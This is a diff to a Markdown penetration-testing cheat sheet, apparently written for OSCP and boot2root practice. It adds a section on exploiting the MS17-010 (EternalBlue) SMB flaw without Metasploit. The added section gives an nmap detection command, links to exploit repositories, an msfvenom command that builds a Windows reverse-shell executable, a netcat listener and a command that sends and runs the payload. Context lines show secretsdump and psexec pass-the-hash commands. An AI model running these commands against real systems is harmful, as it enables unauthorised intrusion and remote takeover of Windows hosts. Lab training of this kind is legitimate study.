@@ -18,6 +18,7 @@ Table of Contents
       * [Using BloodHound](#using-bloodhound)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
+   * [Eternal* Vulnerabilities exploitation](#eternal*-vulnerabilities-exploitation)
    * [WebApplication Hacking](#webapplication-hacking)
       * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
       * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
@@ -206,6 +207,34 @@ secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
 # And if we have luck, we can use the hash with *psexec*, or try to crack it.
 ./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
 ```
+
+# Eternal* Vulnerabilities exploitation
+
+For those who want to exploit this very common vulnerabilities, present in a lot of boot2root machines, but taking the handicap that no Metasploit is going to be utilized, there are different techiniques/exploits that you can use. 
+
+Metasploit can be avoided for example if you are being training yourself to get OSCP certification you surely know that MSF is banned...
+
+To detect if we are in front of the vulnerability, the nmap can do the job:
+```bash
+sudo nmap -p445 --script smb-vuln-ms17-010 <target>
+```
+
+There is also a [usefull script](https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py) which will check for the vulnerability into the [IP] server we indicate.
+
+**Once we know the system is vulnerable** we can use [this repositoy](https://github.com/helviojunior/MS17-010). We should also create a valid payload, I think nowadays OSCP doesn't penalize the use of *msfvenom* as long as we don't use it to create a 'meterpreter' payload. The following command can be executed:
+```bash
+ msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe
+ ```
+ 
+ We can put a listening socket like this:
+ ```bash
+ sudo nc -lvp 443
+ ```
+ 
+ And finally, we launch the attack:
+ ```bash
+ python send_and_execute.py $ip reverse-shell.exe
+ ```
 
 # WebApplication Hacking
 ## Create a PHP Backdoor shell
